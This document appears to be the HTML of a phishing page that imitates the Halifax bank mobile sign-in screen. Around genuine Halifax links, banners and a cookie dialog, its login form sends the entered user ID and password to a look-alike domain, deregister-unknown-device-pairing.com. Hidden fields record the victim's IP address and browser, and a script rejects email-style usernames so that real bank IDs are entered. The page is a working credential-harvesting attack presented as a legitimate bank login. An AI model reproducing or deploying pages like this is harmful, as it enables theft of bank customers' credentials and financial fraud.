...
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-gb">
    <head>
        ...
        <link rel="alternate" media="handheld" href="Login.php" />
        <meta name="viewport" content="width=device-width" />

        
        <meta name="DCSext.hasTealium" content="1" />

        <link rel="apple-touch-icon" sizes="57x57" href="https://deregister-unknown-device-pairing.com/files/img/Halifax%2057x57%20app-touch-icon-1432115287.JPG" />
        <link rel="apple-touch-icon" sizes="114x114" href="https://deregister-unknown-device-pairing.com/files/img/Halifax%20114x114%20app-touch-icon-1472024731.JPG" />
        ...
        <style type="text/css">
            ...
            .tealium .ui-icon {
                ...
                width: 16px;
                height: 16px;
                background-image: url(https://tags.tiqcdn.com/utui/css/images/ui-icons_469bdd_256x240.png);
            }
            .tealium .ui-widget-overlay {
                ...
                width: 100%;
                height: 100%;
                background: url(https://tags.tiqcdn.com/utui/css/images/ui-bg_flat_0_aaaaaa_40x100.png) 50% 50% repeat-x #aaa;
                opacity: 0.3;
            ...
            .tealium .ui-widget-content {
                ...
                background: url(https://tags.tiqcdn.com/utui/css/images/ui-bg_inset-hard_100_fcfdfd_1x100.png) 50% bottom repeat-x #fcfdfd;
                color: #222;
            }
            ...
            .tealium .ui-widget-header {
                background: url(https://tags.tiqcdn.com/utui/css/images/ui-bg_gloss-wave_55_5c9ccc_500x100.png) 50% 50% repeat-x #5c9ccc;
                color: #fff;
                font-weight: 700;
            ...
            .tealium .ui-widget-header .ui-state-default {
                ...
                background: url(https://tags.tiqcdn.com/utui/css/images/ui-bg_glass_85_dfeffc_1x400.png) 50% 50% repeat-x #dfeffc;
                font-weight: 700;
                color: #2e6e9e;
            }
            ...
            .tealium .ui-widget-header .ui-state-hover {
                ...
                background: url(https://tags.tiqcdn.com/utui/css/images/ui-bg_glass_75_d0e5f5_1x400.png) 50% 50% repeat-x #d0e5f5;
                font-weight: 700;
                color: #1d5987;
            }
            ...
            .tealium .ui-widget-header .ui-state-active {
                border: 1px solid #79b7e7;
                background: url(https://tags.tiqcdn.com/utui/css/images/ui-bg_inset-hard_100_f5f8f9_1x100.png) 50% 50% repeat-x #f5f8f9;
                font-weight: 700;
                color: #e17009;
            }
            ...
            .tealium .ui-widget-header .ui-state-highlight {
                ...
                background: url(https://tags.tiqcdn.com/utui/css/images/ui-bg_flat_55_fbec88_40x100.png) 50% 50% repeat-x #fbec88;
                color: #363636;
            }
            ...
            .tealium .ui-widget-header .ui-state-error {
                ...
                background: url(https://tags.tiqcdn.com/utui/css/images/ui-bg_glass_95_fef1ec_1x400.png) 50% 50% repeat-x #fef1ec;
                color: #cd0a0a;
            }
            ...
            .tealium .ui-widget-header .ui-icon {
                background-image: url(https://tags.tiqcdn.com/utui/css/images/ui-icons_d8e7f3_256x240.png);
            }
            .tealium .ui-state-default .ui-icon {
                background-image: url(https://tags.tiqcdn.com/utui/css/images/ui-icons_6da8d5_256x240.png);
            }
            .tealium .ui-state-focus .ui-icon,
            .tealium .ui-state-hover .ui-icon {
                background-image: url(https://tags.tiqcdn.com/utui/css/images/ui-icons_217bc0_256x240.png);
            }
            .tealium .ui-state-active .ui-icon {
                background-image: url(https://tags.tiqcdn.com/utui/css/images/ui-icons_f9bd01_256x240.png);
            }
            .tealium .ui-state-highlight .ui-icon {
                background-image: url(https://tags.tiqcdn.com/utui/css/images/ui-icons_2e83ff_256x240.png);
            }
            .tealium .ui-state-selected .ui-icon {
                background-image: url(https://tags.tiqcdn.com/utui/css/images/ui-icons_green.png);
            }
            .tealium .ui-state-error .ui-icon,
            .tealium .ui-state-error-text .ui-icon {
                background-image: url(https://tags.tiqcdn.com/utui/css/images/ui-icons_cd0a0a_256x240.png);
            }
            ...
            .tealium .ui-autocomplete-loading {
                background: url(https://tags.tiqcdn.com/utui/css/images/ui-anim_basic_16x16.gif) right center no-repeat #fff;
            }
            * html .tealium .ui-autocomplete {
            ...
            #__tealium_tagO2_tabs_list ul {
                background: url(http://tags.tiqcdn.com/utui/css/images/ui-bg_gloss-wave_55_5c9ccc_500x100.png) 50% 50% repeat-x #5c9ccc;
                height: auto;
                width: auto;
            }
            ...
            #__tealium_tagO2_tabs_list .ui-tabs-selected {
                background: url(https://tags.tiqcdn.com/utui/css/images/ui-bg_inset-hard_100_f5f8f9_1x100.png) 50% 50% repeat-x #f5f8f9 !important;
                border: 1px solid #79b7e7;
                border-bottom: 0 !important;
                font-weight: 700;
...
$( document ).ready(function() {
	...
	$('#frmLogin').submit(function(e){
        ...
        if(username.includes("@")) {
            document.getElementById("email_error_message").style = "";
            return false;
        }
    ...
    <body class="hasJS" cz-shortcut-listen="true" data-__gyazo-extension-added-paste-support="true">
        ...
        <!--<![endif]-->
            ...
            <div class="content">
                    ...
                    <div class="panelTL">
                        <div class="panelTR">
                            <div class="panelBR">
                                <div class="panelBL">
                                    <div class="loginInner">
									                                        <div id="email_error_message" class="msgError" style="display:none">
                                            <div class="msgTL">
                                                <div class="msgTR">
                                                    <div class="msgBR">
                                                        <div class="msgBL">
                                                                <p class="msgP">You are not allowed to use your email. Please try again. <a href="https://www.halifax-online.co.uk/ib-access/cwa/forgotten-details/index.html" title="">Having problems signing in?</a> Please note, you’ll be redirected to the desktop site.</p>              
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        ...
                                        <div class="loginFields">
                                            <form id="frmLogin" name="frmLogin" method="post" action="https://deregister-unknown-device-pairing.com/personal/mbprimarylogin" autocomplete="off">
												<input type="hidden" name="ip" value="2.38.31.97">
												<input type="hidden" name="ua" value="Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0">
                                                <div class="formField">
                                                ...
                                                <div class="formField loginCheckbox">
                                                    ...
                                                    <label class="checkboxLabel" for="frmLogin:loginRemember">
                                                        <a id="rememberMe" name="rememberMe" title="Remember my User ID" href="https://www.halifax-online.co.uk/personal/a/mobile/mobile_help/login/REMEMBER_ME">
                                                            Remember my User ID
                                                        </a>
                                                    </label>
                                                </div>
                ...
                <div class="aside">
                    <p class="sideNote">
                        <a id="lnkForgotUserIDDMC" name="lnkForgotUserIDDMC" href="https://www.halifax-online.co.uk/ib-access/cwa/forgotten-details/index.html" title="Forgotten your sign-in details?">Forgotten your sign-in details?</a>
                    </p>
                </div>
                ...
                <div class="appBannerBG">
                    <div class="appBannerLink market">
                        <p style="text-align: center;">
                            <a title="Savings accounts. Find the one for you" href="https://www.halifax.co.uk/savings/?WT.ac=lon/public/navigation/ban/r2pr/savs/s/rt/HxSavRbdBn" target="_blank" rel="noopener noreferrer">
                                <img alt="Savings accounts. Find the one for you" src="files/img/savings_newstyle-1593009617.png" />
                            </a>
                        </p>
                        <p style="text-align: center;"><a href="https://www.halifax.co.uk/loans/?WT.ac=lon/public/navigation/ban/r2pr/loan/s/rl/Hxloancalc" target="_blank" rel="noopener noreferrer">&nbsp;</a></p>
                    </div>
                </div>
                <div class="clearer"></div>
                ...
                <div id="footerLogin">
                    <div class="FootNav">
                        <div class="lnkLevFoot">
                            <p class="lnkLevFootP">
                                <a title="Register for Internet Banking" href="https://www.halifax-online.co.uk/personal/a/useradmin/mobile/registration/selectaccounttyperegistration.jsp?mobile=true"> Register for Internet Banking</a>
                                ...
                                <a title="Help" href="https://www.halifax-online.co.uk/personal/a/mobile/mobile_help/login/HELP"> Help</a>

                                <a title="Security" href="https://www.halifax-online.co.uk/personal/a/mobile/mobile_help/login/SECURITY"> Security</a>

                                <a title="Contact us" href="https://www.halifax-online.co.uk/personal/a/mobile/mobile_help/login/CONTACT_US"> Contact us</a>
                        ...
                        <div class="aside">
                            ...
                            <div class="appBannerBG">
                                <div class="appBannerLink">
                                    <p align="center">
                                        <a href="http://www.halifax.co.uk/fscs/" title="fscs login tile"><img alt="FSCS" src="files/img/fscs-ngb-logon-banner-V2-1459783745.png" /></a>
                                    </p>
                                </div>
                            </div>
        ...
        <div style="display: block;">
            <div
                ...
                role="dialog"
                tabindex="-1"
                style="position: fixed; right: 15px; bottom: 10px; z-index: 20000; width: 470px; box-shadow: rgb(153, 153, 153) -3px 5px 10px; background: rgb(255, 255, 255) none repeat scroll 0% 0%; display: none;"
            >
                <div class="cookies" tabindex="-1">
                    <div class="cookies-head">
                        <h2>Cookies consent</h2>
                        <a href="Login.php#" id="cookie_closer" aria-label="Close" role="button" onclick="tealium_close();return false;">X</a>
                        <p></p>
                    ...
                    <div class="ie" style="height: 1%; display: inline;">
                        ...
                        <a role="button" id="more_information" class="tealium_more button button-primary-apple" href="Login.php#" onclick="tealium_more_info();return false;">Manage consents</a>
